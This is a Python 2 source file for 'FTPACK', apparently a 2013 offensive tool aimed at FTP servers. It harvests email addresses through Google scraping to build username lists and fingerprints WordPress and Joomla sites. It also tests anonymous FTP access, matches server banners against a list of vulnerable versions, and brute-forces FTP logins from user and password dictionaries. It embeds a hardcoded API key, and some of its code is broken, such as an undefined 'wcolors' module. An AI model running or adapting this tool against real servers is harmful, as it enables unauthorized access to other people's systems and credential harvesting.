#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       untitled.py
#       
#       Copyright 2013 Juan Sebastian Eljach <juan_eljach10@hotmail.com>
#       
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#       
#    This program is free software: you can redistribute it and/or modify 
#    it under the terms of the GNU General Public License as published by   
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version. 
#   
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of 
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.         
#                                                         
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>  

import ftplib
import os
import socket
import sys
import urllib2
import urllib
import myparser
import re
import httplib
from bs4 import BeautifulSoup
from optparse import OptionParser

if "linux" in sys.platform:
	os.system("clear")
elif "win" in sys.platform:
	os.system("cls")
else:
	pass

#from here is by Christian Martorella
class search_google:
	def __init__(self,word,limit,start):
		self.word=word
		self.files=""
		self.results=""
		self.totalresults=""
		self.server="www.google.com"
		self.hostname="www.google.com"
		self.userAgent="(Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6"
		self.quantity="100"
		self.limit=limit
		self.counter=start
		self.api_key="AIzaSyBuBomy0n51Gb4836isK2Mp65UZI_DrrwQ"
		
	def do_search(self):
		h = httplib.HTTP(self.server)
		h.putrequest('GET', "/search?num="+self.quantity+"&start=" + str(self.counter) + "&hl=en&meta=&q=%40\"" + self.word + "\"")
		h.putheader('Host', self.hostname)
		h.putheader('User-agent', self.userAgent)	
		h.endheaders()
		returncode, returnmsg, headers = h.getreply()
		self.results = h.getfile().read()
		self.totalresults+= self.results
						
	def get_emails(self):
		rawres=myparser.parser(self.totalresults,self.word)
		return rawres.emails()
		
	def process(self):
		while self.counter <= self.limit and self.counter <= 1000:
			self.do_search()
			#more = self.check_next()
			print "\t[*]Searching "+ str(self.counter) + " results..."
			self.counter+=100



#so far By Chris Martorella

class color:
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	RED = '\033[91m'
	ENDC = '\033[0m'
	
print color.BLUE + "\t\t************FTPACK**************" + color.ENDC
print color.BLUE + "\t\t**                            **" + color.ENDC
print color.BLUE + "\t\t** Developed By: @juan_eljach **" + color.ENDC
print color.BLUE + "\t\t**                            **" + color.ENDC
print color.BLUE + "\t\t********************************" + color.ENDC

global_options = ["0.0.0.0",21]


def fingerprinting():
	url = socket.gethostbyaddr(global_options[0])[0]
	params = urllib.urlencode({'remoteHost': url})
	headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}

	open_conection = httplib.HTTPConnection("ipfingerprints.com")
	open_conection.request("POST", "/scripts/getReverseIP.php", params, headers)
	answer = open_conection.getresponse()
	source = answer.read()
	soup = BeautifulSoup(source)
	current_link = ''

	print color.BLUE + "\nDomains Found in server: " + str(len(soup.find_all("a"))) + color.ENDC + "\n"
	for link in soup.find_all('a'):
		current_link = link.get('href')
		print current_link[11:-2]
	
	url = raw_input(color.GREEN + "\nPlease specific One domain: " + color.ENDC)
	if re.match("http://", url):
		url = re.sub("http://", "", url)
	else:
		pass
	print color.GREEN + "\n[*]Starting Fingerprinting to: "+url[4:] + color.ENDC
	search = search_google(url[4:],500,0)
	search.process()
	all_emails = search.get_emails()
	
	if all_emails == []:
		print color.RED + "\n[*]Emails not found" + color.ENDC
		users_file="users_finger.txt"
	else:
		users_file = "users_finger.txt"
		users = open(users_file,"w")
		for email in all_emails:
			x = email.find("@")
			users.write(email[:x]+"\n")

	if users_file!="":
		print color.BLUE + "\n[*]Possible users Saved in: " + users_file + color.ENDC
	else:
		pass
		
	#IDENTIFICACION DE TECNOLOGIAS
	url = raw_input(color.GREEN + "Please specific URL to Web Fingerprinting: " + color.ENDC)
	if re.match("http://", url):
		url = re.sub("http://", "", url)
	else:
		pass
	print color.GREEN + "[*]Detecting Web Technologies" + color.ENDC
	dir_wordpress = ["/readme.html", "/wp-login", "/wp-includes/", "/wp-content/", "/wp-login.php"]
	ans_wordpress = []
	dir_joomla = ["/robots.txt", "/administrator/", "/language/", "/templates/", "/plugins"]      
	ans_joomla = []
	
	for x in dir_joomla:
		try:
			conexion = urllib2.urlopen("http://"+url+x)
			print "\t[*]" + url+x + ": " + color.BLUE + "OK" + color.ENDC
			if conexion.getcode() == 200:
				ans_joomla.append(conexion.getcode())
		except:
			ans_joomla.append(404)
	
	for x in dir_wordpress:
		try:
			conexion = urllib2.urlopen("http://"+url+x)
			print "\t[*]" + url+x + ": " + color.BLUE + "OK" + color.ENDC
			if conexion.getcode() == 200:
				ans_wordpress.append(conexion.getcode())
		except:
			ans_wordpress.append(404)
			
	if ans_joomla[0] and ans_joomla[1] and ans_joomla[2] and ans_joomla[3] and ans_joomla[4] == 200:
		print color.BLUE + "\n[*]Web Technology: Joomla" + color.ENDC
	elif ans_wordpress[0] and ans_wordpress[1] and ans_wordpress[2] and ans_wordpress[3] and ans_wordpress[4] == 200:
		print color.BLUE + "\n[*]Web Technology: Wordpress" + color.ENDC
		web = "wordpress"
		if web == "wordpress":
			des = raw_input("Do you want gather possible users?[Y/N]: ")
			des = des.lower()
			if des == "y":
				print color.BLUE + "[*]Gathering" + color.ENDC
				com = "./lol.sh "+url+" 5"
				tub = os.popen(com)
				result = tub.readlines()
				tub.close()
				if result == []:
					print color.RED + "Not users found!" + color.ENDC
				else:
					users = open(users_file,"w")
					print color.GREEN + "[*]Saving possible users in: " + color.ENDC + users_file
					for x in result:
						users.write(x)
			else:
				pass
	else:
		print color.BLUE + "[*]Web Tecnology: Unknowledgement" + color.ENDC
	print color.GREEN + "[*]You may make a Brute Force Attack!" + color.ENDC

def brute():
	try:
		ud = open(global_options[2],"r")
		pd = open(global_options[3],"r")
			
		users = ud.readlines()
		passwords = pd.readlines()
			
		for user in users:
			for password in passwords:
				try:
					print wcolors.color.GREEN + "[*]Trying to connect" + wcolors.color.ENDC
					conect = ftplib.FTP(global_options[0])
					ans = conect.login(user,password)
					if ans == "230 Login successful.":
						print "User: ", user
						print "Password: ",password
					else:
						pass
				except ftplib.error_perm:
					print wcolors.color.RED + "Can't Brute Force" + wcolors.color.ENDC
					conect.close
			
	except(KeyboardInterrupt):
		print "Interrupted. Later!"
		sys.exit()
			
def scan():
	try:
		users = ["anonymous","anonymous"+"@"+global_options[0]]
		passwords = ["guest","anonymous","","anonymous"+"@"+global_options[0]]
	
		print color.GREEN + "[*]Wait Please\n" + color.ENDC
		print color.GREEN + "[*]IP: " + global_options[0] + color.ENDC
		print color.GREEN + "[*]Port: " + str(global_options[1]) + "\n" + color.ENDC
		
		for user in users:
			for password in passwords:
				try:
					try:
						conect = ftplib.FTP(global_options[0])
					except socket.error:
						print color.RED + "[*]Can't conect to FTP" + color.ENDC
						sys.exit()
					ans = conect.login(user,password)
					if "230" in ans:
						anon_login = "Allowed"
						global_options.insert(2, anon_login)
						print color.GREEN + "For user: "+ color.ENDC + color.BLUE + user + color.ENDC + color.GREEN + " and password: " + color.ENDC + color.BLUE + password + color.ENDC
						print color.GREEN + "\t[*]Anonymous Access: " + global_options[2] + color.ENDC
		
					else:
						pass
				except ftplib.error_perm:
					anon_login = "Disallowed"
					global_options.insert(2, anon_login)
					print color.GREEN + "For user: "+ color.ENDC + color.BLUE + user + color.ENDC + color.GREEN + " and password: " + color.ENDC + color.BLUE + password + color.ENDC
					print color.RED + "\t[*]Anonymous Access: " + global_options[2]  + color.ENDC
		
		socket.setdefaulttimeout(2)
		s = socket.socket()
		try:
			s.connect((global_options[0],global_options[1]))
			ans_socket = s.recv(1024)
			global_options.insert(4, ans_socket)
			print color.GREEN + "\n[*]FTP Banner: " + global_options[4] + color.ENDC
			s.close()
		except(socket.error):
			pass

		banners = open("banners.txt","r")
		banners_list = banners.readlines()
		

		for x in banners_list:

			if x.strip() in global_options[4]:
				print color.BLUE + "[*]Server Vulnerable: " + x.strip() + color.ENDC
				print color.GREEN + "[*]Try a Exploit!" + color.ENDC
			else:
				pass					
	except(KeyboardInterrupt):
		print "Interrupted. Later!"
		sys.exit()


parser = OptionParser()
parser.add_option("-i", dest="ip",
                  help="Host to scan", metavar="IP")
parser.add_option("-p", type="int", dest="port",
                  help="Port in Host to scan", metavar="Port")
parser.add_option("--users", dest="users",
                  help="txt Users Dictionary for Brute Force", metavar="USERS")
parser.add_option("--passwords", dest="passwd",
                  help="txt Passwords Dictionary for Brute Force", metavar="PASS")
parser.add_option("--scan", dest="scanHost",
                  action="store_true",
                  help="Start scan")
parser.add_option("--brute", dest="bruteAttack",
                  action="store_true",
                  help="Start Brute Force Attack")
parser.add_option("--finger", dest="fingerAttack",
                  action="store_true",
                  help="Start Fingerprintin")                                    


(options, args) = parser.parse_args()

if options.ip:
	global_options[0] = options.ip
else:
	print color.RED + "\n[*]Error: " + color.ENDC + "missing a mandatory option. use -h for help\n"
if options.port:
	global_options[1] = options.port
else:
	pass
	
if options.ip and options.port and options.users and options.passwd and options.bruteAttack:
	global_options.insert(2, options.users)
	global_options.insert(3, options.passwd)
	brute()
else:
	pass
if options.ip and options.port and options.scanHost:
	scan()
else:
	pass
if options.ip and options.fingerAttack:
	fingerprinting()
else:
	pass

